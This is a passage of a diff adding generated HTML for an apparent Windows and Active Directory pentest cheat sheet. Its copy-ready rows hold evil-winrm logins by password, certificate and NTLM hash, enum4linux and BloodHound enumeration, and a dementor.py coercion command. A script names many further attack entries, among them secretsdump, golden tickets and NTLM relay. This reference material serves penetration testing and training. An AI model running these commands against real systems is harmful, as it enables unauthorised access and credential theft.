+    <li><a href="/wadcoms/FindUncommonShares/#SMB">SMB</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    <li><a href="/wadcoms/FindUncommonShares/#Linux">Linux</a></li>
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/FindUncommonShares/#Windows">Windows</a></li>
+    
+    
+</ul>
+</p></td>
+            </tr>
+            
+            <tr>
+		    <td><div class="bin-name"><div style="flex: 0 0 97%"><a href="/wadcoms/Evil-Winrm-PKINIT/" id="/wadcoms/Evil-Winrm-PKINIT/" style="text-decoration: none; color: DarkGreen;">evil-winrm -i 10.10.10.1 -c pub.pem -k priv.pem -S -r EVILCORP
+</a></div><div style="flex: 1;"><a href="javascript:void(0)" onclick="copyFunction('/wadcoms/Evil-Winrm-PKINIT/')"><img src="/assets/copy-button.svg" alt="Copy" title="Copy" id="/wadcoms/Evil-Winrm-PKINIT/_img" /></a></div></div><p style="margin-top: -12px;"><ul class="filter-list">
+    
+    
+    
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/Evil-Winrm-PKINIT/#Exploitation">Exploitation</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/Evil-Winrm-PKINIT/#PFX">PFX</a></li>
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/Evil-Winrm-PKINIT/#WMI">WMI</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/Evil-Winrm-PKINIT/#Windows">Windows</a></li>
+    
+    
+</ul>
+</p></td>
+            </tr>
+            
+            <tr>
+		    <td><div class="bin-name"><div style="flex: 0 0 97%"><a href="/wadcoms/Evil-WinRM/" id="/wadcoms/Evil-WinRM/" style="text-decoration: none; color: DarkGreen;">evil-winrm -i 10.10.10.1 -u john -p password123
+</a></div><div style="flex: 1;"><a href="javascript:void(0)" onclick="copyFunction('/wadcoms/Evil-WinRM/')"><img src="/assets/copy-button.svg" alt="Copy" title="Copy" id="/wadcoms/Evil-WinRM/_img" /></a></div></div><p style="margin-top: -12px;"><ul class="filter-list">
+    
+    
+    
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/Evil-WinRM/#Exploitation">Exploitation</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    <li><a href="/wadcoms/Evil-WinRM/#Username">Username</a></li>
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/Evil-WinRM/#Password">Password</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/Evil-WinRM/#WMI">WMI</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    <li><a href="/wadcoms/Evil-WinRM/#Linux">Linux</a></li>
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/Evil-WinRM/#Windows">Windows</a></li>
+    
+    
+</ul>
+</p></td>
+            </tr>
+            
+            <tr>
+		    <td><div class="bin-name"><div style="flex: 0 0 97%"><a href="/wadcoms/Evil-WinRM-PTH/" id="/wadcoms/Evil-WinRM-PTH/" style="text-decoration: none; color: DarkGreen;">evil-winrm -i 10.10.10.1 -u john -H c23b2e293fa0d312de6f59fd6d58eae3
+</a></div><div style="flex: 1;"><a href="javascript:void(0)" onclick="copyFunction('/wadcoms/Evil-WinRM-PTH/')"><img src="/assets/copy-button.svg" alt="Copy" title="Copy" id="/wadcoms/Evil-WinRM-PTH/_img" /></a></div></div><p style="margin-top: -12px;"><ul class="filter-list">
+    
+    
+    
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/Evil-WinRM-PTH/#Exploitation">Exploitation</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    <li><a href="/wadcoms/Evil-WinRM-PTH/#Username">Username</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/Evil-WinRM-PTH/#Hash">Hash</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/Evil-WinRM-PTH/#WMI">WMI</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    <li><a href="/wadcoms/Evil-WinRM-PTH/#Linux">Linux</a></li>
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/Evil-WinRM-PTH/#Windows">Windows</a></li>
+    
+    
+</ul>
+</p></td>
+            </tr>
+            
+            <tr>
+		    <td><div class="bin-name"><div style="flex: 0 0 97%"><a href="/wadcoms/Enum4Linux-NoCreds/" id="/wadcoms/Enum4Linux-NoCreds/" style="text-decoration: none; color: DarkGreen;">enum4linux -a 10.10.10.1
+</a></div><div style="flex: 1;"><a href="javascript:void(0)" onclick="copyFunction('/wadcoms/Enum4Linux-NoCreds/')"><img src="/assets/copy-button.svg" alt="Copy" title="Copy" id="/wadcoms/Enum4Linux-NoCreds/_img" /></a></div></div><p style="margin-top: -12px;"><ul class="filter-list">
+    
+    
+    
+    
+    <li><a href="/wadcoms/Enum4Linux-NoCreds/#Enumeration">Enumeration</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/Enum4Linux-NoCreds/#No_Creds">No Creds</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    <li><a href="/wadcoms/Enum4Linux-NoCreds/#Linux">Linux</a></li>
+    
+    
+    
+    
+    
+    
+</ul>
+</p></td>
+            </tr>
+            
+            <tr>
+		    <td><div class="bin-name"><div style="flex: 0 0 97%"><a href="/wadcoms/Enum4Linux-Creds/" id="/wadcoms/Enum4Linux-Creds/" style="text-decoration: none; color: DarkGreen;">enum4linux -u john -p password123 -a 10.10.10.1
+</a></div><div style="flex: 1;"><a href="javascript:void(0)" onclick="copyFunction('/wadcoms/Enum4Linux-Creds/')"><img src="/assets/copy-button.svg" alt="Copy" title="Copy" id="/wadcoms/Enum4Linux-Creds/_img" /></a></div></div><p style="margin-top: -12px;"><ul class="filter-list">
+    
+    
+    
+    
+    <li><a href="/wadcoms/Enum4Linux-Creds/#Enumeration">Enumeration</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    <li><a href="/wadcoms/Enum4Linux-Creds/#Username">Username</a></li>
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/Enum4Linux-Creds/#Password">Password</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    <li><a href="/wadcoms/Enum4Linux-Creds/#Linux">Linux</a></li>
+    
+    
+    
+    
+    
+    
+</ul>
+</p></td>
+            </tr>
+            
+            <tr>
+		    <td><div class="bin-name"><div style="flex: 0 0 97%"><a href="/wadcoms/Dementor/" id="/wadcoms/Dementor/" style="text-decoration: none; color: DarkGreen;">python3 dementor.py -u john -p password123 -d test.local 10.10.10.2 10.10.10.1
+</a></div><div style="flex: 1;"><a href="javascript:void(0)" onclick="copyFunction('/wadcoms/Dementor/')"><img src="/assets/copy-button.svg" alt="Copy" title="Copy" id="/wadcoms/Dementor/_img" /></a></div></div><p style="margin-top: -12px;"><ul class="filter-list">
+    
+    
+    
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/Dementor/#Exploitation">Exploitation</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    <li><a href="/wadcoms/Dementor/#Username">Username</a></li>
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/Dementor/#Password">Password</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/Dementor/#RPC">RPC</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/Dementor/#NTLM">NTLM</a></li>
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    <li><a href="/wadcoms/Dementor/#Linux">Linux</a></li>
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/Dementor/#Windows">Windows</a></li>
+    
+    
+</ul>
+</p></td>
+            </tr>
+            
+            <tr>
+		    <td><div class="bin-name"><div style="flex: 0 0 97%"><a href="/wadcoms/BloodHound.py-Remote-Ingestion/" id="/wadcoms/BloodHound.py-Remote-Ingestion/" style="text-decoration: none; color: DarkGreen;">bloodhound.py -d test.local -v --zip -c All -dc test.local -ns 10.10.10.1
+</a></div><div style="flex: 1;"><a href="javascript:void(0)" onclick="copyFunction('/wadcoms/BloodHound.py-Remote-Ingestion/')"><img src="/assets/copy-button.svg" alt="Copy" title="Copy" id="/wadcoms/BloodHound.py-Remote-Ingestion/_img" /></a></div></div><p style="margin-top: -12px;"><ul class="filter-list">
+    
+    
+    
+    
+    <li><a href="/wadcoms/BloodHound.py-Remote-Ingestion/#Enumeration">Enumeration</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/BloodHound.py-Remote-Ingestion/#No_Creds">No Creds</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/BloodHound.py-Remote-Ingestion/#LDAP">LDAP</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    <li><a href="/wadcoms/BloodHound.py-Remote-Ingestion/#Linux">Linux</a></li>
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/BloodHound.py-Remote-Ingestion/#Windows">Windows</a></li>
+    
+    
+</ul>
+</p></td>
+            </tr>
+            
+            <tr>
+		    <td><div class="bin-name"><div style="flex: 0 0 97%"><a href="/wadcoms/BloodHound.py-Remote-Ingestion-Creds/" id="/wadcoms/BloodHound.py-Remote-Ingestion-Creds/" style="text-decoration: none; color: DarkGreen;">bloodhound.py -u john -p password123 -d test.local -v --zip -c All -dc test.local -ns 10.10.10.1
+</a></div><div style="flex: 1;"><a href="javascript:void(0)" onclick="copyFunction('/wadcoms/BloodHound.py-Remote-Ingestion-Creds/')"><img src="/assets/copy-button.svg" alt="Copy" title="Copy" id="/wadcoms/BloodHound.py-Remote-Ingestion-Creds/_img" /></a></div></div><p style="margin-top: -12px;"><ul class="filter-list">
+    
+    
+    
+    
+    <li><a href="/wadcoms/BloodHound.py-Remote-Ingestion-Creds/#Enumeration">Enumeration</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    <li><a href="/wadcoms/BloodHound.py-Remote-Ingestion-Creds/#Username">Username</a></li>
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/BloodHound.py-Remote-Ingestion-Creds/#Password">Password</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/BloodHound.py-Remote-Ingestion-Creds/#LDAP">LDAP</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    <li><a href="/wadcoms/BloodHound.py-Remote-Ingestion-Creds/#Linux">Linux</a></li>
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/BloodHound.py-Remote-Ingestion-Creds/#Windows">Windows</a></li>
+    
+    
+</ul>
+</p></td>
+            </tr>
+            
+        </tbody>
+        <tfoot>
+		<tr><td id="search-message" colspan="2">Couldn't find the command you're looking for? <a href="/contribute/">Contribute</a> your own!</td></tr>
+        </tfoot>
+    </table>
+</div>
+
+<script>
+
+ function copyFunction(file_url) {
+	 var copyCommand = document.getElementById(file_url);
+
+	 navigator.clipboard.writeText(copyCommand.innerText).then(() => {
+		 
+		 document.getElementById("/wadcoms/BloodHound.py-Remote-Ingestion-Creds/_img").alt = "Copy";
+		 document.getElementById("/wadcoms/BloodHound.py-Remote-Ingestion-Creds/_img").title = "Copy";
+		 
+		 document.getElementById("/wadcoms/BloodHound.py-Remote-Ingestion/_img").alt = "Copy";
+		 document.getElementById("/wadcoms/BloodHound.py-Remote-Ingestion/_img").title = "Copy";
+		 
+		 document.getElementById("/wadcoms/Dementor/_img").alt = "Copy";
+		 document.getElementById("/wadcoms/Dementor/_img").title = "Copy";
+		 
+		 document.getElementById("/wadcoms/Enum4Linux-Creds/_img").alt = "Copy";
+		 document.getElementById("/wadcoms/Enum4Linux-Creds/_img").title = "Copy";
+		 
+		 document.getElementById("/wadcoms/Enum4Linux-NoCreds/_img").alt = "Copy";
+		 document.getElementById("/wadcoms/Enum4Linux-NoCreds/_img").title = "Copy";
+		 
+		 document.getElementById("/wadcoms/Evil-WinRM-PTH/_img").alt = "Copy";
+		 document.getElementById("/wadcoms/Evil-WinRM-PTH/_img").title = "Copy";
+		 
+		 document.getElementById("/wadcoms/Evil-WinRM/_img").alt = "Copy";
+		 document.getElementById("/wadcoms/Evil-WinRM/_img").title = "Copy";
+		 
+		 document.getElementById("/wadcoms/Evil-Winrm-PKINIT/_img").alt = "Copy";
+		 document.getElementById("/wadcoms/Evil-Winrm-PKINIT/_img").title = "Copy";
+		 
+		 document.getElementById("/wadcoms/FindUncommonShares/_img").alt = "Copy";
+		 document.getElementById("/wadcoms/FindUncommonShares/_img").title = "Copy";
+		 
+		 document.getElementById("/wadcoms/Impacket-DCOMExec/_img").alt = "Copy";
+		 document.getElementById("/wadcoms/Impacket-DCOMExec/_img").title = "Copy";
+		 
+		 document.getElementById("/wadcoms/Impacket-Get-GPPPassword/_img").alt = "Copy";
+		 document.getElementById("/wadcoms/Impacket-Get-GPPPassword/_img").title = "Copy";
+		 
+		 document.getElementById("/wadcoms/Impacket-GetADUsers/_img").alt = "Copy";
+		 document.getElementById("/wadcoms/Impacket-GetADUsers/_img").title = "Copy";
+		 
+		 document.getElementById("/wadcoms/Impacket-GetNPUsers/_img").alt = "Copy";
+		 document.getElementById("/wadcoms/Impacket-GetNPUsers/_img").title = "Copy";
+		 
+		 document.getElementById("/wadcoms/Impacket-GetUserSPNs/_img").alt = "Copy";
+		 document.getElementById("/wadcoms/Impacket-GetUserSPNs/_img").title = "Copy";
+		 
+		 document.getElementById("/wadcoms/Impacket-GoldenTicket/_img").alt = "Copy";
+		 document.getElementById("/wadcoms/Impacket-GoldenTicket/_img").title = "Copy";
+		 
+		 document.getElementById("/wadcoms/Impacket-LookUpSID/_img").alt = "Copy";
+		 document.getElementById("/wadcoms/Impacket-LookUpSID/_img").title = "Copy";
+		 
+		 document.getElementById("/wadcoms/Impacket-Mimikatz/_img").alt = "Copy";
+		 document.getElementById("/wadcoms/Impacket-Mimikatz/_img").title = "Copy";
+		 
+		 document.getElementById("/wadcoms/Impacket-NTLMRelayX-Socks/_img").alt = "Copy";
+		 document.getElementById("/wadcoms/Impacket-NTLMRelayX-Socks/_img").title = "Copy";
+		 
+		 document.getElementById("/wadcoms/Impacket-NTLMRelayX-WPAD/_img").alt = "Copy";
+		 document.getElementById("/wadcoms/Impacket-NTLMRelayX-WPAD/_img").title = "Copy";
+		 
+		 document.getElementById("/wadcoms/Impacket-NTLMRelayX/_img").alt = "Copy";
+		 document.getElementById("/wadcoms/Impacket-NTLMRelayX/_img").title = "Copy";
+		 
+		 document.getElementById("/wadcoms/Impacket-PsExec-PassTheTicket/_img").alt = "Copy";
+		 document.getElementById("/wadcoms/Impacket-PsExec-PassTheTicket/_img").title = "Copy";
+		 
+		 document.getElementById("/wadcoms/Impacket-PsExec/_img").alt = "Copy";
+		 document.getElementById("/wadcoms/Impacket-PsExec/_img").title = "Copy";
+		 
+		 document.getElementById("/wadcoms/Impacket-RBCD/_img").alt = "Copy";
+		 document.getElementById("/wadcoms/Impacket-RBCD/_img").title = "Copy";
+		 
+		 document.getElementById("/wadcoms/Impacket-RPCDump/_img").alt = "Copy";
+		 document.getElementById("/wadcoms/Impacket-RPCDump/_img").title = "Copy";
+		 
+		 document.getElementById("/wadcoms/Impacket-Reg/_img").alt = "Copy";
+		 document.getElementById("/wadcoms/Impacket-Reg/_img").title = "Copy";
+		 
+		 document.getElementById("/wadcoms/Impacket-SAMRDump/_img").alt = "Copy";
+		 document.getElementById("/wadcoms/Impacket-SAMRDump/_img").title = "Copy";
+		 
+		 document.getElementById("/wadcoms/Impacket-SMBClient/_img").alt = "Copy";
+		 document.getElementById("/wadcoms/Impacket-SMBClient/_img").title = "Copy";
+		 
+		 document.getElementById("/wadcoms/Impacket-SMBExec/_img").alt = "Copy";
+		 document.getElementById("/wadcoms/Impacket-SMBExec/_img").title = "Copy";
+		 
+		 document.getElementById("/wadcoms/Impacket-SecretsDump-NTDS/_img").alt = "Copy";
+		 document.getElementById("/wadcoms/Impacket-SecretsDump-NTDS/_img").title = "Copy";
+		 
+		 document.getElementById("/wadcoms/Impacket-SecretsDump/_img").alt = "Copy";
+		 document.getElementById("/wadcoms/Impacket-SecretsDump/_img").title = "Copy";
+		 
+		 document.getElementById("/wadcoms/Impacket-Services/_img").alt = "Copy";
+		 document.getElementById("/wadcoms/Impacket-Services/_img").title = "Copy";
+		 
+		 document.getElementById("/wadcoms/Impacket-SilverTicket/_img").alt = "Copy";
+		 document.getElementById("/wadcoms/Impacket-SilverTicket/_img").title = "Copy";
+		 
+		 document.getElementById("/wadcoms/Impacket-WMIExec/_img").alt = "Copy";
+		 document.getElementById("/wadcoms/Impacket-WMIExec/_img").title = "Copy";
+		 
+		 document.getElementById("/wadcoms/Impacket-addcomputer-LDAPS/_img").alt = "Copy";
+		 document.getElementById("/wadcoms/Impacket-addcomputer-LDAPS/_img").title = "Copy";
+		 
+		 document.getElementById("/wadcoms/Impacket-addcomputer-SMB/_img").alt = "Copy";
+		 document.getElementById("/wadcoms/Impacket-addcomputer-SMB/_img").title = "Copy";
+		 
+		 document.getElementById("/wadcoms/Impacket-atexec-Creds/_img").alt = "Copy";
+		 document.getElementById("/wadcoms/Impacket-atexec-Creds/_img").title = "Copy";
+		 
+		 document.getElementById("/wadcoms/Impacket-atexec-Hash/_img").alt = "Copy";
+		 document.getElementById("/wadcoms/Impacket-atexec-Hash/_img").title = "Copy";
+		 
+		 document.getElementById("/wadcoms/Impacket-getST-Creds/_img").alt = "Copy";
+		 document.getElementById("/wadcoms/Impacket-getST-Creds/_img").title = "Copy";
+		 
+		 document.getElementById("/wadcoms/Impacket-getST-Hash/_img").alt = "Copy";
+		 document.getElementById("/wadcoms/Impacket-getST-Hash/_img").title = "Copy";
+		 
+		 document.getElementById("/wadcoms/Impacket-getTGT/_img").alt = "Copy";
+		 document.getElementById("/wadcoms/Impacket-getTGT/_img").title = "Copy";
+		 
+		 document.getElementById("/wadcoms/Kerbrute-BruteForce/_img").alt = "Copy";
+		 document.getElementById("/wadcoms/Kerbrute-BruteForce/_img").title = "Copy";
+		 
+		 document.getElementById("/wadcoms/Kerbrute-BruteUser/_img").alt = "Copy";
+		 document.getElementById("/wadcoms/Kerbrute-BruteUser/_img").title = "Copy";
+		 
+		 document.getElementById("/wadcoms/Kerbrute-PasswordSpray/_img").alt = "Copy";
+		 document.getElementById("/wadcoms/Kerbrute-PasswordSpray/_img").title = "Copy";
+		 
+		 document.getElementById("/wadcoms/Kerbrute-UserEnum/_img").alt = "Copy";
+		 document.getElementById("/wadcoms/Kerbrute-UserEnum/_img").title = "Copy";
+		 
+		 document.getElementById("/wadcoms/LDAPSearch-Creds/_img").alt = "Copy";
+		 document.getElementById("/wadcoms/LDAPSearch-Creds/_img").title = "Copy";
+		 
+		 document.getElementById("/wadcoms/LDAPSearch-NoCreds/_img").alt = "Copy";
+		 document.getElementById("/wadcoms/LDAPSearch-NoCreds/_img").title = "Copy";
+		 
+		 document.getElementById("/wadcoms/Mitm6/_img").alt = "Copy";
+		 document.getElementById("/wadcoms/Mitm6/_img").title = "Copy";
+		 
+		 document.getElementById("/wadcoms/NetExec-Enum-LDAP/_img").alt = "Copy";
+		 document.getElementById("/wadcoms/NetExec-Enum-LDAP/_img").title = "Copy";
+		 
+		 document.getElementById("/wadcoms/NetExec-Enum-SMB-Anonymous/_img").alt = "Copy";
+		 document.getElementById("/wadcoms/NetExec-Enum-SMB-Anonymous/_img").title = "Copy";
+		 
+		 document.getElementById("/wadcoms/NetExec-Enum-SMB-Null/_img").alt = "Copy";
+		 document.getElementById("/wadcoms/NetExec-Enum-SMB-Null/_img").title = "Copy";
+		 
+		 document.getElementById("/wadcoms/NetExec-Enum-SMB-Relay-List/_img").alt = "Copy";
+		 document.getElementById("/wadcoms/NetExec-Enum-SMB-Relay-List/_img").title = "Copy";
+		 
+		 document.getElementById("/wadcoms/NetExec-Enum-SMB/_img").alt = "Copy";
+		 document.getElementById("/wadcoms/NetExec-Enum-SMB/_img").title = "Copy";
+		 
+		 document.getElementById("/wadcoms/NetExec-Exec-SMB/_img").alt = "Copy";
+		 document.getElementById("/wadcoms/NetExec-Exec-SMB/_img").title = "Copy";
+		 
+		 document.getElementById("/wadcoms/NetExec-SMB-Password-Spray/_img").alt = "Copy";
+		 document.getElementById("/wadcoms/NetExec-SMB-Password-Spray/_img").title = "Copy";
+		 
+		 document.getElementById("/wadcoms/Nmap-Krb5-Enum-Users/_img").alt = "Copy";
+		 document.getElementById("/wadcoms/Nmap-Krb5-Enum-Users/_img").title = "Copy";
+		 
+		 document.getElementById("/wadcoms/PKINIT-getnthash/_img").alt = "Copy";
+		 document.getElementById("/wadcoms/PKINIT-getnthash/_img").title = "Copy";
+		 
+		 document.getElementById("/wadcoms/PKINIT-gettgtpkinit/_img").alt = "Copy";
+		 document.getElementById("/wadcoms/PKINIT-gettgtpkinit/_img").title = "Copy";
+		 
+		 document.getElementById("/wadcoms/PetitPotam/_img").alt = "Copy";
+		 document.getElementById("/wadcoms/PetitPotam/_img").title = "Copy";
+		 
+		 document.getElementById("/wadcoms/PowerView-Find-DomainShare/_img").alt = "Copy";
+		 document.getElementById("/wadcoms/PowerView-Find-DomainShare/_img").title = "Copy";
+		 
+		 document.getElementById("/wadcoms/PowerView-Get-DomainGroupMember/_img").alt = "Copy";
+		 document.getElementById("/wadcoms/PowerView-Get-DomainGroupMember/_img").title = "Copy";
+		 
+		 document.getElementById("/wadcoms/PowerView-Get-DomainUser-ASREP/_img").alt = "Copy";
+		 document.getElementById("/wadcoms/PowerView-Get-DomainUser-ASREP/_img").title = "Copy";
+		 
+		 document.getElementById("/wadcoms/PowerView-Get-DomainUser/_img").alt = "Copy";
+		 document.getElementById("/wadcoms/PowerView-Get-DomainUser/_img").title = "Copy";
+		 
+		 document.getElementById("/wadcoms/PyLDAPmonitor/_img").alt = "Copy";
+		 document.getElementById("/wadcoms/PyLDAPmonitor/_img").title = "Copy";
+		 
+		 document.getElementById("/wadcoms/PyWhisker/_img").alt = "Copy";
+		 document.getElementById("/wadcoms/PyWhisker/_img").title = "Copy";
+		 
+		 document.getElementById("/wadcoms/RPCClient-Anonymous/_img").alt = "Copy";
+		 document.getElementById("/wadcoms/RPCClient-Anonymous/_img").title = "Copy";
+		 
+		 document.getElementById("/wadcoms/Regexe-Persistence/_img").alt = "Copy";
+		 document.getElementById("/wadcoms/Regexe-Persistence/_img").title = "Copy";
+		 
+		 document.getElementById("/wadcoms/Responder-Analyze/_img").alt = "Copy";
+		 document.getElementById("/wadcoms/Responder-Analyze/_img").title = "Copy";
+		 
+		 document.getElementById("/wadcoms/Rubeus-ASREPRoast/_img").alt = "Copy";
+		 document.getElementById("/wadcoms/Rubeus-ASREPRoast/_img").title = "Copy";
+		 
+		 document.getElementById("/wadcoms/Rubeus-AskTGT/_img").alt = "Copy";
+		 document.getElementById("/wadcoms/Rubeus-AskTGT/_img").title = "Copy";
+		 
+		 document.getElementById("/wadcoms/Rubeus-Brute/_img").alt = "Copy";
+		 document.getElementById("/wadcoms/Rubeus-Brute/_img").title = "Copy";
+		 
+		 document.getElementById("/wadcoms/Rubeus-Kerberoast/_img").alt = "Copy";
+		 document.getElementById("/wadcoms/Rubeus-Kerberoast/_img").title = "Copy";
+		 
+		 document.getElementById("/wadcoms/SMBClient-Enum-Share-Anonymous/_img").alt = "Copy";
+		 document.getElementById("/wadcoms/SMBClient-Enum-Share-Anonymous/_img").title = "Copy";
+		 
+		 document.getElementById("/wadcoms/SMBClient-Enum-Share/_img").alt = "Copy";
+		 document.getElementById("/wadcoms/SMBClient-Enum-Share/_img").title = "Copy";
+		 
+		 document.getElementById("/wadcoms/SMBClient-List-Share-PTH/_img").alt = "Copy";
+		 document.getElementById("/wadcoms/SMBClient-List-Share-PTH/_img").title = "Copy";
+		 
+		 document.getElementById("/wadcoms/SMBClient-List-Shares-Anonymous/_img").alt = "Copy";
+		 document.getElementById("/wadcoms/SMBClient-List-Shares-Anonymous/_img").title = "Copy";
+		 
+		 document.getElementById("/wadcoms/SMBClient-List-Shares/_img").alt = "Copy";
+		 document.getElementById("/wadcoms/SMBClient-List-Shares/_img").title = "Copy";
+		 
+		 document.getElementById("/wadcoms/SMBMap-Enum-File/_img").alt = "Copy";
+		 document.getElementById("/wadcoms/SMBMap-Enum-File/_img").title = "Copy";
+		 
+		 document.getElementById("/wadcoms/SMBMap-Enum-Share-Anonymous/_img").alt = "Copy";
+		 document.getElementById("/wadcoms/SMBMap-Enum-Share-Anonymous/_img").title = "Copy";
+		 
+		 document.getElementById("/wadcoms/SMBMap-Enum-Share/_img").alt = "Copy";
+		 document.getElementById("/wadcoms/SMBMap-Enum-Share/_img").title = "Copy";
+		 
+		 document.getElementById("/wadcoms/SafetyKatz/_img").alt = "Copy";
+		 document.getElementById("/wadcoms/SafetyKatz/_img").title = "Copy";
+		 
+		 document.getElementById("/wadcoms/Seatbelt/_img").alt = "Copy";
+		 document.getElementById("/wadcoms/Seatbelt/_img").title = "Copy";
+		 
+		 document.getElementById("/wadcoms/SharpDump/_img").alt = "Copy";
+		 document.getElementById("/wadcoms/SharpDump/_img").title = "Copy";
+		 
+		 document.getElementById("/wadcoms/SharpHound-LDAP/_img").alt = "Copy";
+		 document.getElementById("/wadcoms/SharpHound-LDAP/_img").title = "Copy";
+		 
+		 document.getElementById("/wadcoms/SharpHound/_img").alt = "Copy";
+		 document.getElementById("/wadcoms/SharpHound/_img").title = "Copy";
+		 
+		 document.getElementById("/wadcoms/SharpLDAPmonitor/_img").alt = "Copy";
+		 document.getElementById("/wadcoms/SharpLDAPmonitor/_img").title = "Copy";
+		 
+		 document.getElementById("/wadcoms/SharpUp/_img").alt = "Copy";
+		 document.getElementById("/wadcoms/SharpUp/_img").title = "Copy";
+		 
+		 document.getElementById("/wadcoms/SharpWMI/_img").alt = "Copy";
+		 document.getElementById("/wadcoms/SharpWMI/_img").title = "Copy";
+		 
+		 document.getElementById("/wadcoms/Snaffler/_img").alt = "Copy";
+		 document.getElementById("/wadcoms/Snaffler/_img").title = "Copy";
+		 
+		 document.getElementById("/wadcoms/Windapsearch/_img").alt = "Copy";
+		 document.getElementById("/wadcoms/Windapsearch/_img").title = "Copy";
+		 
+		 document.getElementById("/wadcoms/targetedKerberoast/_img").alt = "Copy";
+		 document.getElementById("/wadcoms/targetedKerberoast/_img").title = "Copy";
+		 
+		 document.getElementById("/wadcoms/winPEAS/_img").alt = "Copy";
+		 document.getElementById("/wadcoms/winPEAS/_img").title = "Copy";
+		 
+		 document.getElementById(file_url + "_img").alt = "Copied";
+		 document.getElementById(file_url + "_img").title = "Copied";
+	 }, () => {
+		 console.log("copy failed");
+	 });
+
+ }
+
+ function handleChange(checkbox, label) {
